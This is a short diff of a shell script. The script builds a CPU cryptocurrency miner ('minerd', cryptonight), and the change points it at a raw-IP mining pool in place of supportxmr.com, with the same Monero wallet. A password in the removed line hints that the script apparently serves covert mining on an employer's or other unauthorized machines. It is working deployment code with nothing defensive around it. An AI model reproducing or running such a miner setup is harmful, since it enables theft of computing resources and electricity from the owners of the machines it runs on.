@@ -66,5 +66,5 @@ chmod 777 autogen.sh
 ./autogen.sh
 CFLAGS="-march=native" ./configure
 make
-./minerd -a cryptonight -o stratum+tcp://de01.supportxmr.com:80 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p bossfuckedyou -t 2
+./minerd -a cryptonight -o stratum+tcp://89.35.29.48:81 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p x -t 2
 echo "done"
